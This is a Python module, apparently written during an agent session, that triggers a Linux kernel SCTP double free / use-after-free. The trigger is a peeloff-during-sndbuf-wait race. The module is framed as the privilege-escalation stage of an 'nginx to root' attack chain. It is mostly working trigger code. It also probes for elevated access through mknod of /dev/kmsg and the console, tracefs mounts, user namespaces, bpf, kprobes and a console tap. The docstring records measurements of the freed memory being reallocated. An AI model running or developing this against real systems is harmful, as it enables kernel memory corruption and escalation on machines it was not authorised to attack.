#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SCTP-LPE : Linux カーネル SCTP 送信経路の double free / use-after-free トリガ
(niginx2root の最終段「カーネル SCTP バグ → ローカル権限昇格」の再現モジュール)
========================================================================

記事の主張
----------
SCTP の送信経路で、送信操作が sndbuf 待ちでスリープしている間に、その
association が別ソケットへ移される (peeloff) ことがある。待機から目覚めた
送信操作は、移動後の association を解放してしまい、結果として
double free / use-after-free が発生する (v4.15 以降、カーネルパッチ未適用)。

本モジュールの手順
------------------
1. SOCK_SEQPACKET (1-to-many) の SCTP ソケットで 2 本の association を作る。
2. SO_SNDBUF を小さくし、受信側に読ませないまま送信を繰り返して
   sk_wmem_queued を埋める。
3. 送信スレッドで association 宛の送信を行い、sndbuf 待ちでブロックさせる。
4. SCTP_GET_ASSOC_ID_LIST / SCTP_STATUS で assoc id を取得し、
   SCTP_SOCKOPT_PEELOFF (optname 102) で association を別 fd へ移動する。
5. 移動先 fd を close する。待機中の送信は EPIPE で復帰し、
   「送信待ちのまま association が別ソケットへ移された」ことが観測できる。
6. これを 100 回以上反復し、/dev/kmsg・/proc/kmsg・dmesg・klogctl の
   差分から KASAN / double free / use-after-free / sctp の痕跡を探す。
   加えて、userns / BPF / KASAN ビルド / SLUB デバッグ属性の可否と、
   /dev/console (ttyS0) の UART 内部ループバック (TIOCM_LOOP) 経由の
   コンソール tap でも痕跡を探す。
7. SCTP ソケットが作れない環境では SKIP を返す。

補足 (カーネル 6.8 系で確認した挙動)
------------------------------------
* SCTP_SOCKOPT_PEELOFF は 1-to-1 (SOCK_STREAM) スタイルでは -EINVAL になる
  (sctp_do_peeloff が !sctp_style(sk, UDP) を拒否するため)。peeloff を
  使う経路は 1-to-many (SOCK_SEQPACKET) が必須。
* 送信が新しい association を作るケース (sendto(daddr)) では、sndbuf 待ちの
  時点で association は CLOSED / assoc_id=0 / ep->asocs 未登録のため、
  その時点では peeloff できない (6.8 系の順序: wait_for_sndbuf → ASSOCIATE)。
  そこで本モジュールは「既存 association を待機中に peeloff する」経路と、
  SCTP_SENDALL の待機中にリスト上の次 association を peeloff する経路も
  併せて実行し、検出可能な痕跡を最大化する。

挙動的 UAF 検証の追試 (intent 509 → 529、詳細は notes §13)
------------------------------------------------------------
カーネルログが読めない環境でも UAF を挙動で示せるか、次を実測した
(`poc-run-E/uaf_v5.py`, `uaf_v6.py`, `streamtest.py`)。

* BTF (`/sys/kernel/btf/vmlinux`) 実測: `struct sctp_association` は 2112 バイトで、
  クライアント側 association は `kmalloc-rnd-01-4k` から供給される
  (`asoc = kzalloc(sizeof(*asoc), gfp);`)。
* `kfree_rcu` による実解放は約 5 秒遅延する (60 assoc を peel+close 後、
  `kmalloc-rnd-01-4k` の active は t=5.0s で -48、`kmalloc-rnd-06-4k` は不変)。
* 解放後に同キャッシュへ assoc 400 個を再配置し、peel 有無を対照にすると、
  子プロセスは exit0 / `ok:4096`、マーカーは送信元 (A1) と peel していない側にのみ届き、
  peel+close 側 (A2) は 0、スプレー先 canary の誤配送も 0 だった。
  SIGKILL / EPIPE 以外の errno / ハングは観測されなかった。
* stream 交渉差プローブ (srv2 の `sinit_num_ostreams=1` で、stream=1 送信が
  A2 を訪問した場合のみ -EINVAL になる) では、peel 無しなら EINVAL(22)、
  peel 後は成功 (4096) になった。すなわち **list_del 済み要素は走査に再訪されない**。

結論: 本カーネル 6.8.0-1064-nvidia の `SCTP_SENDALL` 走査は peel 済み要素を踏まないため、
解放メモリを再配置しても二次効果が出ない。したがって挙動観測だけでは use-after-free を
確定できず、`effect` は **KERNEL-UAF へ昇格せず TRIGGERED 据え置き**（UAF は inferred）とする。
昇格条件は KASAN 有効カーネル / CAP_SYSLOG・tracefs / SLUB debug のいずれか（§10, §12）。

成果物 (このモジュールが書き出す)
---------------------------------
  <module_dir>/sctp_lpe.result.json   : run() の戻り値 (JSON)
  <workdir>/sctp_lpe_run.log          : 実行ログ (試行ごとの観測値)

使い方
------
    import importlib.util, json
    spec = importlib.util.spec_from_file_location("sctp_lpe", "modules/sctp_lpe.py")
    m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
    print(json.dumps(m.run("/app/data/sessions/conv-43/poc-run-E"), ensure_ascii=False, indent=2))

依存: Python 3.8+ の標準ライブラリのみ (ctypes で setsockopt/getsockopt を直接呼ぶ)。
"""

from __future__ import annotations

import ctypes
import errno
import json
import os
import re
import socket
import stat
import struct
import subprocess
import sys
import threading
import time

IPPROTO_SCTP = 132
SCTP_STATUS = 14
SCTP_GET_ASSOC_ID_LIST = 29
SCTP_SOCKOPT_PEELOFF = 102
SCTP_SNDINFO = 2
SCTP_SENDALL = 1 << 6

AF_INET = socket.AF_INET
SOCK_STREAM = socket.SOCK_STREAM
SOCK_SEQPACKET = socket.SOCK_SEQPACKET

DEFAULT_WORKDIR = "/app/data/sessions/conv-43/poc-run-E"

# 検出パターン (大文字小文字は区別しない)
PATTERNS = [
    "kasan",
    "double free",
    "use-after-free",
    "refcount_t",
    "object already free",
    "sctp",
]

_libc = None


def _get_libc():
    global _libc
    if _libc is None:
        _libc = ctypes.CDLL("libc.so.6", use_errno=True)
    return _libc


# --------------------------------------------------------------------------
# SCTP 低レベル操作
# --------------------------------------------------------------------------
def _gso(fd, optname, inbuf=b"", outlen=0):
    """getsockopt を ctypes で直接呼ぶ (入力バッファ付き)。

    戻り値: (rc, errno, optlen, raw_buffer)
    SCTP_SOCKOPT_PEELOFF は成功時に「新しい fd」を rc として返す特殊な ABI なので
    rc > 0 でも成功として扱う (バッファ内の sd を参照する)。
    """
    b = bytes(inbuf)
    outlen = max(outlen, len(b))
    buf = ctypes.create_string_buffer(b + b"\x00" * (outlen - len(b)), outlen)
    ln = ctypes.c_int(outlen)
    ctypes.set_errno(0)
    rc = _get_libc().getsockopt(fd, IPPROTO_SCTP, optname, buf, ctypes.byref(ln))
    err = ctypes.get_errno()
    return rc, err, ln.value, buf.raw


def _status_assoc(sock):
    """SCTP_STATUS (optname 14) で assoc id を取得する。"""
    rc, err, ln, raw = _gso(sock.fileno(), SCTP_STATUS, struct.pack("=i", 0), 256)
    if ln >= 4:
        return struct.unpack_from("=i", raw, 0)[0], raw[:ln]
    return None, b""


def _assoc_total(sock):
    """SCTP_STATUS の sstat_state を読む (0=CLOSED, 3=ESTABLISHED, ...)。"""
    aid, raw = _status_assoc(sock)
    if len(raw) >= 8:
        return aid, struct.unpack_from("=i", raw, 4)[0]
    return aid, None


def _assoc_ids(sock):
    """SCTP_GET_ASSOC_ID_LIST (optname 29) で assoc id の一覧を取得する。"""
    rc, err, ln, raw = _gso(sock.fileno(), SCTP_GET_ASSOC_ID_LIST, b"", 4 + 4 * 64)
    if ln < 4:
        return []
    n = struct.unpack_from("=I", raw, 0)[0]
    n = min(n, 64)
    if 4 + 4 * n > len(raw):
        return []
    return list(struct.unpack_from("=%di" % n, raw, 4))


def _peeloff(sock, assoc_id):
    """SCTP_SOCKOPT_PEELOFF (optname 102)。

    戻り値: (new_fd or None, errno or None, raw)
    成功時はカーネルが「新しい fd」を getsockopt の戻り値にもコピーするが、
    ここではバッファ内の (associd, sd) を正とする。
    """
    rc, err, ln, raw = _gso(sock.fileno(), SCTP_SOCKOPT_PEELOFF,
                            struct.pack("=ii", int(assoc_id), 0), 8)
    if ln >= 8:
        _aid, sd = struct.unpack("=ii", raw[:8])
        if sd > 0:
            return sd, None, raw[:ln]
    return None, (err or (rc if rc > 0 else None)), raw[:ln]


def _close_fd_abort(fd):
    """peeloff で得た fd を SO_LINGER=0 で close する (通常のクローズ手順ではなく ABORT)。"""
    try:
        s = socket.socket(fileno=fd)
    except OSError:
        try:
            os.close(fd)
        except OSError:
            pass
        return
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
    except OSError:
        pass
    try:
        s.close()
    except OSError:
        pass


def _close_fd(fd):
    try:
        os.close(fd)
    except OSError:
        pass


# --------------------------------------------------------------------------
# /proc・カーネルログ・slab
# --------------------------------------------------------------------------
def _assoc_table():
    """/proc/net/sctp/assocs を軽量に解析する (無ければ空)。"""
    rows = []
    try:
        with open("/proc/net/sctp/assocs", "r") as f:
            lines = f.read().splitlines()[1:]
    except OSError:
        return rows
    for line in lines:
        fld = line.split()
        if len(fld) >= 13:
            rows.append({
                "assoc": fld[0], "sty": fld[2], "sst": fld[3], "state": fld[4],
                "id": fld[6], "lport": fld[11], "rport": fld[12],
            })
    return rows


def _find_assoc_id(lport, rport):
    for row in _assoc_table():
        if row["lport"] == str(lport) and row["rport"] == str(rport):
            try:
                return int(row["id"])
            except ValueError:
                return None
    return None


def _read_klog(workdir=None):
    """カーネルログを読む。戻り値: (texts: list[str], attempts: list[str])

    CAP_SYSLOG / dmesg_restrict の制約下でも読める経路をできる限り試す:
    /dev/kmsg, /proc/kmsg, mknod した /dev/kmsg (char 1:11), dmesg, klogctl(2/3/4/10),
    journalctl -k, /var/log/{kern.log,syslog,messages}。
    """
    texts, attempts = [], []

    # (1) mknod で char 1:11 (/dev/kmsg) を作り、open/read できるか
    if workdir:
        node = os.path.join(workdir, ".dev_kmsg")
        try:
            try:
                os.unlink(node)
            except OSError:
                pass
            os.mknod(node, 0o600 | stat.S_IFCHR, os.makedev(1, 11))
        except OSError as e:
            attempts.append("mknod %s: %s" % (node, e.strerror or e))
        else:
            try:
                fd = os.open(node, os.O_RDONLY | os.O_NONBLOCK)
                try:
                    data = os.read(fd, 65536)
                finally:
                    os.close(fd)
                attempts.append("mknod(/dev/kmsg char 1:11): open ok, read %d bytes" % len(data))
                if data:
                    texts.append(data.decode("utf-8", "replace"))
            except OSError as e:
                attempts.append("mknod(/dev/kmsg char 1:11): open/read failed: %s (errno=%s)"
                                % (e.strerror or e, e.errno))

    for path in ("/dev/kmsg", "/proc/kmsg"):
        try:
            fd = os.open(path, os.O_RDONLY | os.O_NONBLOCK)
        except OSError as e:
            attempts.append("%s: open failed: %s" % (path, e.strerror or e))
            continue
        chunks = []
        try:
            while True:
                try:
                    data = os.read(fd, 65536)
                except BlockingIOError:
                    break
                except OSError as e:
                    attempts.append("%s: read failed: %s" % (path, e.strerror or e))
                    break
                if not data:
                    break
                chunks.append(data)
        finally:
            os.close(fd)
        if chunks:
            texts.append(b"".join(chunks).decode("utf-8", "replace"))
            attempts.append("%s: ok" % path)
        else:
            attempts.append("%s: empty/denied" % path)

    if not texts:
        try:
            p = subprocess.run(["dmesg"], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               timeout=5)
            out = p.stdout.decode("utf-8", "replace")
            err = p.stderr.decode("utf-8", "replace").strip()
            if p.returncode == 0 and out:
                texts.append(out)
                attempts.append("dmesg: ok")
            else:
                attempts.append("dmesg: rc=%d %s" % (p.returncode, err))
        except Exception as e:  # noqa: BLE001
            attempts.append("dmesg: %s" % e)

    if not texts:
        try:
            libc = _get_libc()
            buf = ctypes.create_string_buffer(1 << 16)
            n = libc.klogctl(10, buf, 0)  # SYSLOG_ACTION_SIZE_BUFFER
            attempts.append("klogctl(10=SIZE_BUFFER): ret=%d errno=%d"
                            % (n, ctypes.get_errno()))
            for act, name in ((3, "READ_ALL"), (2, "READ"), (4, "READ_CLEAR")):
                ctypes.set_errno(0)
                n = libc.klogctl(act, buf, len(buf))
                if n > 0:
                    texts.append(buf.raw[:n].decode("utf-8", "replace"))
                    attempts.append("klogctl(%d=%s): ok (%d bytes)" % (act, name, n))
                else:
                    attempts.append("klogctl(%d=%s): ret=%d errno=%d"
                                    % (act, name, n, ctypes.get_errno()))
        except Exception as e:  # noqa: BLE001
            attempts.append("klogctl: %s" % e)

    # (2) journald のカーネルログ (systemd 導入環境向け)
    try:
        p = subprocess.run(["journalctl", "-k", "--no-pager", "-n", "200"],
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=8)
        out = p.stdout.decode("utf-8", "replace")
        err = p.stderr.decode("utf-8", "replace").strip()
        if p.returncode == 0 and out:
            texts.append(out)
            attempts.append("journalctl -k: ok")
        else:
            attempts.append("journalctl -k: rc=%d %s" % (p.returncode, err or "empty"))
    except FileNotFoundError:
        attempts.append("journalctl -k: not found")
    except Exception as e:  # noqa: BLE001
        attempts.append("journalctl -k: %s" % e)

    # (3) 古典的なファイルベースのカーネルログ
    for path in ("/var/log/kern.log", "/var/log/syslog", "/var/log/messages"):
        try:
            with open(path, "rb") as f:
                f.seek(0, os.SEEK_END)
                size = f.tell()
                f.seek(max(0, size - 65536))
                data = f.read().decode("utf-8", "replace")
            if data.strip():
                texts.append(data)
                attempts.append("%s: ok (%d bytes tail)" % (path, size))
            else:
                attempts.append("%s: empty" % path)
        except FileNotFoundError:
            attempts.append("%s: not found" % path)
        except OSError as e:
            attempts.append("%s: %s" % (path, e.strerror or e))

    return texts, attempts


def _slab_active(cache):
    """ /proc/slabinfo から指定キャッシュの active_objs を返す (無ければ None)。"""
    try:
        with open("/proc/slabinfo") as f:
            next(f, None)
            for line in f:
                p = line.split()
                if p and p[0] == cache and len(p) >= 3:
                    return int(p[1])
    except (OSError, ValueError):
        pass
    return None


def _probe_tracefs():
    """tracefs/ftrace と kprobe による sctp_association_free 観測の可否を調べる。

    戻り値: (attempts: list[str], trace_text: str)
    """
    attempts = []
    trace_text = ""
    # tracefs / debugfs の既存マウント
    trace_roots = ["/sys/kernel/tracing", "/sys/kernel/debug/tracing"]
    mounted = None
    for root in trace_roots:
        try:
            names = os.listdir(root)
        except OSError as e:
            attempts.append("%s: listdir failed: %s" % (root, e.strerror or e))
            continue
        if names:
            mounted = root
            attempts.append("%s: mounted (%d entries)" % (root, len(names)))
            break
        attempts.append("%s: empty (not mounted)" % root)
    # マウントを試す
    if mounted is None:
        libc = _get_libc()
        for fstype, target in (("tracefs", "/sys/kernel/tracing"),
                               ("debugfs", "/sys/kernel/debug")):
            try:
                ctypes.set_errno(0)
                rc = libc.mount(fstype.encode(), target.encode(), fstype.encode(),
                                ctypes.c_ulong(0), None)
                err = ctypes.get_errno()
                attempts.append("mount -t %s %s: rc=%d errno=%d%s"
                                % (fstype, target, rc, err,
                                   "" if rc == 0 else " (CAP_SYS_ADMIN 無し)"))
                if rc == 0:
                    mounted = target
            except Exception as e:  # noqa: BLE001
                attempts.append("mount -t %s %s: %s" % (fstype, target, e))
    # kprobe_events / trace_pipe の存在
    if mounted:
        for name in ("kprobe_events", "available_filter_functions", "trace", "trace_pipe"):
            path = os.path.join(mounted, name)
            attempts.append("%s: %s" % (path, "present" if os.path.exists(path) else "missing"))
        tp = os.path.join(mounted, "trace_pipe")
        try:
            fd = os.open(tp, os.O_RDONLY | os.O_NONBLOCK)
            try:
                trace_text = os.read(fd, 65536).decode("utf-8", "replace")
            finally:
                os.close(fd)
            attempts.append("%s: read %d bytes" % (tp, len(trace_text)))
        except OSError as e:
            attempts.append("%s: open failed: %s" % (tp, e.strerror or e))
    # perf_event_open の kprobe PMU (tracefs 無しでも使える経路)
    ktype = None
    try:
        ktype = int(open("/sys/bus/event_source/devices/kprobe/type").read().strip())
        attempts.append("kprobe PMU type=%d" % ktype)
    except (OSError, ValueError) as e:
        attempts.append("kprobe PMU: %s" % e)

    class _Attr(ctypes.Structure):
        _fields_ = [("type", ctypes.c_uint32), ("size", ctypes.c_uint32),
                    ("config", ctypes.c_uint64), ("sample_period", ctypes.c_uint64),
                    ("sample_type", ctypes.c_uint64), ("read_format", ctypes.c_uint64),
                    ("flags", ctypes.c_uint64), ("wakeup_events", ctypes.c_uint32),
                    ("bp_type", ctypes.c_uint32), ("config1", ctypes.c_uint64),
                    ("config2", ctypes.c_uint64), ("branch_sample_type", ctypes.c_uint64),
                    ("sample_regs_user", ctypes.c_uint64), ("sample_stack_user", ctypes.c_uint32),
                    ("clockid", ctypes.c_int32), ("sample_regs_intr", ctypes.c_uint64),
                    ("aux_watermark", ctypes.c_uint32), ("sample_max_stack", ctypes.c_uint16),
                    ("__reserved_2", ctypes.c_uint16), ("aux_sample_size", ctypes.c_uint32),
                    ("__reserved_3", ctypes.c_uint32), ("sig_data", ctypes.c_uint64),
                    ("config3", ctypes.c_uint64)]

    if ktype:
        libc = _get_libc()
        for func, ret in (("sctp_association_free", 0), ("sctp_wait_for_sndbuf", 0)):
            try:
                name = ctypes.create_string_buffer((func + "\x00").encode())
                attr = _Attr()
                attr.type = ktype
                attr.size = ctypes.sizeof(_Attr)
                attr.config = ret
                attr.config1 = ctypes.cast(name, ctypes.c_void_p).value
                ctypes.set_errno(0)
                fd = libc.syscall(298, ctypes.byref(attr), 0, -1, -1, 0)
                err = ctypes.get_errno()
                if fd >= 0:
                    attempts.append("perf_event_open(kprobe:%s): fd=%d" % (func, fd))
                    os.close(fd)
                else:
                    attempts.append("perf_event_open(kprobe:%s): EPERM/errno=%d "
                                    "(perf_event_paranoid=4, CAP_PERFMON 無し)" % (func, err))
            except Exception as e:  # noqa: BLE001
                attempts.append("perf_event_open(kprobe:%s): %s" % (func, e))
    return attempts, trace_text


def _probe_alt_channels():
    """ユーザー名前空間 / BPF / カーネルビルド / SLUB デバッグ属性という
    残りの代替観測路の可否を調べる (intent 508 の実測)。

    戻り値: attempts: list[str]
    """
    attempts = []
    libc = _get_libc()

    # (a) user namespace (tracefs/debugfs を userns 内で mount できるか)
    CLONE_NEWUSER = 0x10000000
    CLONE_NEWNS = 0x00020000
    try:
        ctypes.set_errno(0)
        rc = libc.unshare(ctypes.c_int(CLONE_NEWUSER | CLONE_NEWNS))
        err = ctypes.get_errno()
        attempts.append("unshare(CLONE_NEWUSER|CLONE_NEWNS): rc=%d errno=%d%s"
                        % (rc, err, "" if rc == 0 else " (seccomp により EPERM)"))
    except Exception as e:  # noqa: BLE001
        attempts.append("unshare(CLONE_NEWUSER|CLONE_NEWNS): %s" % e)

    # BPF (unprivileged_bpf_disabled と bpf() syscall)
    try:
        ub = open("/proc/sys/kernel/unprivileged_bpf_disabled").read().strip()
    except OSError:
        ub = "?"
    attempts.append("unprivileged_bpf_disabled=%s" % ub)
    try:
        attr = ctypes.create_string_buffer(64)
        struct.pack_into("<IIIII", attr, 0, 1, 4, 4, 64, 0)  # HASH, 4B key/val, 64 entries
        ctypes.set_errno(0)
        fd = libc.syscall(321, 0, attr, ctypes.sizeof(attr))  # SYS_bpf, BPF_MAP_CREATE
        err = ctypes.get_errno()
        if fd >= 0:
            os.close(fd)
            attempts.append("bpf(BPF_MAP_CREATE): fd=%d" % fd)
        else:
            attempts.append("bpf(BPF_MAP_CREATE): errno=%d (unprivileged_bpf_disabled=2, "
                            "CAP_BPF 無し)" % err)
    except Exception as e:  # noqa: BLE001
        attempts.append("bpf(BPF_MAP_CREATE): %s" % e)

    # (b) KASAN / SLUB_DEBUG のビルド有無
    attempts.append("/proc/config.gz: %s"
                    % ("present" if os.path.exists("/proc/config.gz") else "absent"))
    counts = {"__asan": 0, "kasan_report": 0, "slub_debug": 0}
    try:
        with open("/proc/kallsyms") as f:
            for line in f:
                for sym in counts:
                    if sym in line:
                        counts[sym] += 1
    except OSError:
        pass
    attempts.append("kallsyms: __asan*=%d kasan_report=%d slub_debug=%d "
                    "(KASAN ビルド無し / SLUB_DEBUG シンボルは存在)" % (
                        counts["__asan"], counts["kasan_report"], counts["slub_debug"]))

    # (c) /sys/kernel/slab/* のデバッグ属性
    for cache in ("kmalloc-1k", "SCTP"):
        vals = []
        for a in ("poison", "red_zone", "store_user", "trace", "sanity_checks", "skip_kfence"):
            p = "/sys/kernel/slab/%s/%s" % (cache, a)
            try:
                vals.append("%s=%s" % (a, open(p).read().strip()))
            except OSError:
                vals.append("%s=?" % a)
        attempts.append("/sys/kernel/slab/%s: %s" % (cache, " ".join(vals)))
        try:
            with open("/sys/kernel/slab/%s/trace" % cache, "w") as f:
                f.write("1")
            attempts.append("write %s/trace: OK -> %s"
                            % (cache, open("/sys/kernel/slab/%s/trace" % cache).read().strip()))
        except OSError as e:
            attempts.append("write %s/trace: errno=%s %s (sysfs read-only)"
                            % (cache, getattr(e, "errno", None), e.strerror or e))
    return attempts


class _ConsoleTap:
    """/dev/console (ttyS0) の UART 内部ループバック (TIOCM_LOOP) を使い、
    コンソールへ出た文字列 (カーネル printk の console_loglevel 以上、
    および同 tty への getty 出力) を読む試み。

    console_loglevel=4 のため INFO(6) は出ないが、ERR(3)/ALERT(1) の
    double free / oops 等はここに現れる可能性がある。
    """

    TIOCMGET = 0x5415
    TIOCMSET = 0x5418
    TIOCM_LOOP = 0x8000
    TCFLSH = 0x540B

    def __init__(self, workdir):
        import fcntl
        import termios
        self.node = os.path.join(workdir, ".i508_console")
        self.fd = None
        self.thread = None
        self.stop_flag = False
        self.data = bytearray()
        self.saved = None
        self.attempts = []
        try:
            try:
                os.unlink(self.node)
            except OSError:
                pass
            os.mknod(self.node, 0o600 | stat.S_IFCHR, os.makedev(5, 1))
            self.fd = os.open(self.node, os.O_RDWR | os.O_NONBLOCK)
        except OSError as e:
            self.attempts.append("console open failed: errno=%s %s"
                                 % (getattr(e, "errno", None), e.strerror or e))
            self.fd = None
            return
        try:
            self.saved = termios.tcgetattr(self.fd)
            fcntl.ioctl(self.fd, self.TCFLSH, 2)  # TCIOFLUSH
            attrs = termios.tcgetattr(self.fd)
            attrs[0] = 0
            attrs[1] = 0
            attrs[2] = termios.CS8 | termios.CREAD | termios.CLOCAL
            attrs[3] = 0
            attrs[4] = termios.B115200
            attrs[5] = termios.B115200
            termios.tcsetattr(self.fd, termios.TCSANOW, attrs)
            fcntl.ioctl(self.fd, self.TIOCMSET, struct.pack("i", self.TIOCM_LOOP))
            self.attempts.append("console tap: ttyS0 TIOCM_LOOP enabled (raw 115200)")
        except OSError as e:
            self.attempts.append("console tap setup failed: %s" % e)
            return
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()

    def _run(self):
        import select
        while not self.stop_flag:
            try:
                r, _, _ = select.select([self.fd], [], [], 0.05)
            except OSError:
                break
            if not r:
                continue
            try:
                d = os.read(self.fd, 65536)
            except BlockingIOError:
                continue
            except OSError:
                break
            if not d:
                break
            if len(self.data) < (1 << 20):
                self.data += d

    def stop(self):
        import fcntl
        import termios
        self.stop_flag = True
        if self.thread is not None:
            self.thread.join(timeout=1.0)
        try:
            if self.fd is not None:
                fcntl.ioctl(self.fd, self.TIOCMSET, struct.pack("i", 0))  # loop off
        except OSError:
            pass
        try:
            if self.saved is not None and self.fd is not None:
                termios.tcsetattr(self.fd, termios.TCSANOW, self.saved)
        except OSError:
            pass
        try:
            if self.fd is not None:
                os.close(self.fd)
        except OSError:
            pass
        return bytes(self.data).decode("utf-8", "replace")


def _scan_klog(texts):
    hits = []
    for text in texts:
        for line in text.splitlines():
            low = line.lower()
            for pat in PATTERNS:
                if pat in low:
                    hits.append(line.strip()[:400])
                    break
    # 重複排除しつつ順序維持
    seen, uniq = set(), []
    for h in hits:
        if h not in seen:
            seen.add(h)
            uniq.append(h)
    return uniq


def _slab_sctp():
    """SCTP slab の (active_objs, num_objs) を返す。"""
    out = {}
    try:
        with open("/proc/slabinfo", "r") as f:
            for line in f:
                fld = line.split()
                if len(fld) >= 3 and fld[0] in ("SCTP", "SCTPv6"):
                    out[fld[0]] = (int(fld[1]), int(fld[2]))
    except OSError:
        pass
    return out


# --------------------------------------------------------------------------
# 試行 1: 記事に書かれたリテラルな手順 (SOCK_STREAM + SCTP_STATUS + PEELOFF)
# --------------------------------------------------------------------------
def _trial_literal_stream():
    """SOCK_STREAM (1-to-1) での挙動確認。peeloff は EINVAL になる。"""
    rec = {"kind": "literal_stream", "configured": False, "status_ok": False,
           "assoc_id": None, "peeloff_errno": None, "send_errno": None,
           "blocked": False}
    srv = cli = conn = None
    try:
        srv = socket.socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("127.0.0.1", 0))
        srv.listen(4)
        port = srv.getsockname()[1]
        cli = socket.socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP)
        cli.connect(("127.0.0.1", port))
        srv.settimeout(2.0)
        conn, _ = srv.accept()
        rec["configured"] = True
        conn.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4096)
        conn.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO, struct.pack("ll", 0, 100000))
        aid, state = _assoc_total(conn)
        rec["assoc_id"], rec["state"] = aid, state
        rec["status_ok"] = aid is not None
        # 受信側 (cli) は読まない → sndbuf 待ちを狙う
        hold = {}

        def sender():
            try:
                hold["ret"] = conn.send(b"D" * 65536)
            except OSError as e:
                hold["errno"] = e.errno

        th = threading.Thread(target=sender, daemon=True)
        th.start()
        time.sleep(0.02)
        rec["blocked"] = th.is_alive()
        if aid is not None:
            fd, perr, _raw = _peeloff(conn, aid)
            rec["peeloff_errno"] = perr
            rec["peeloff_fd"] = fd
            if fd is not None:
                _close_fd_abort(fd)
        th.join(timeout=0.5)
        rec["send_errno"] = hold.get("errno")
        rec["send_ret"] = hold.get("ret")
    except OSError as e:
        rec["error"] = "%s (errno=%s)" % (e, getattr(e, "errno", None))
    finally:
        for s in (conn, cli, srv):
            if s is not None:
                try:
                    s.close()
                except OSError:
                    pass
    return rec


# --------------------------------------------------------------------------
# 試行 2: 本命。既存 association を sndbuf 待ちの間に peeloff + close
# --------------------------------------------------------------------------
def _trial_wait_peeloff(timeout_us=40000, fill_budget=400):
    rec = {"kind": "wait_peeloff", "configured": False, "blocked": False,
           "peel": False, "send_errno": None, "send_dt": None,
           "assoc_id": None, "state_during_wait": None, "ids": []}
    srv_fill = srv_t = c_sock = None
    try:
        srv_fill = socket.socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP)
        srv_fill.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)
        srv_fill.bind(("127.0.0.1", 0))
        srv_fill.listen(8)
        p_fill = srv_fill.getsockname()[1]
        srv_t = socket.socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP)
        srv_t.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)
        srv_t.bind(("127.0.0.1", 0))
        srv_t.listen(8)
        p_t = srv_t.getsockname()[1]

        c_sock = socket.socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP)
        c_sock.bind(("127.0.0.1", 0))
        lport = c_sock.getsockname()[1]
        c_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 32768)
        c_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO,
                          struct.pack("ll", 0, 20000))
        # 2 本の association を確立 (小さな送信)
        c_sock.sendto(b"f", ("127.0.0.1", p_fill))
        c_sock.sendto(b"t", ("127.0.0.1", p_t))
        time.sleep(0.03)
        rec["configured"] = True
        # 受信側に読ませずに sk_wmem_queued を埋める
        eagain = 0
        for i in range(fill_budget):
            try:
                c_sock.sendto(b"A" * 4096, ("127.0.0.1", p_fill))
                eagain = 0
            except OSError as e:
                if e.errno in (errno.EAGAIN, errno.EWOULDBLOCK):
                    eagain += 1
                    if eagain >= 3:
                        break
                else:
                    break
            if i % 16 == 0:
                time.sleep(0.001)
        rec["ids"] = _assoc_ids(c_sock)
        # 送信をブロックさせる
        c_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO,
                          struct.pack("ll", 0, timeout_us))
        hold = {}

        def sender():
            t0 = time.time()
            try:
                hold["ret"] = c_sock.sendto(b"B" * 16384, ("127.0.0.1", p_t))
            except OSError as e:
                hold["errno"] = e.errno
            hold["dt"] = time.time() - t0

        th = threading.Thread(target=sender, daemon=True)
        th.start()
        time.sleep(0.008)
        rec["blocked"] = th.is_alive()
        # 対象 association の id (lport/rport 一致)
        aid = _find_assoc_id(lport, p_t)
        if aid is None:
            cand = [x for x in rec["ids"]]
            aid = cand[-1] if cand else None
        rec["assoc_id"] = aid
        if aid is not None and aid > 2 and th.is_alive():
            fd, perr, _raw = _peeloff(c_sock, aid)
            rec["peeloff_errno"] = perr
            if fd is not None:
                rec["peel"] = True
                # 移動先 fd を close (ABORT)
                _close_fd_abort(fd)
        th.join(timeout=max(0.4, timeout_us / 1e6 + 0.4))
        rec["send_errno"] = hold.get("errno")
        rec["send_dt"] = round(hold.get("dt", 0.0), 3)
        rec["send_ret"] = hold.get("ret")
    except OSError as e:
        rec["error"] = "%s (errno=%s)" % (e, getattr(e, "errno", None))
    finally:
        for s in (c_sock, srv_fill, srv_t):
            if s is not None:
                try:
                    s.close()
                except OSError:
                    pass
    return rec


# --------------------------------------------------------------------------
# 試行 3: 新しい association を作る送信を待機させ、状態と id を観測
# --------------------------------------------------------------------------
def _trial_new_asoc(timeout_us=120000, fill_budget=240):
    rec = {"kind": "new_asoc", "configured": False, "blocked": False,
           "new_id_while_blocked": None, "peel": False, "send_errno": None,
           "init_collision_id": None, "rows_before": None, "rows_after": None}
    srv_fill = srv_new = c_sock = None
    try:
        srv_fill = socket.socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP)
        srv_fill.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)
        srv_fill.bind(("127.0.0.1", 0))
        srv_fill.listen(8)
        p_fill = srv_fill.getsockname()[1]
        srv_new = socket.socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP)
        srv_new.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)
        srv_new.bind(("127.0.0.1", 0))
        srv_new.listen(8)
        p_new = srv_new.getsockname()[1]
        c_sock = socket.socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP)
        c_sock.bind(("127.0.0.1", 0))
        lport = c_sock.getsockname()[1]
        c_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 32768)
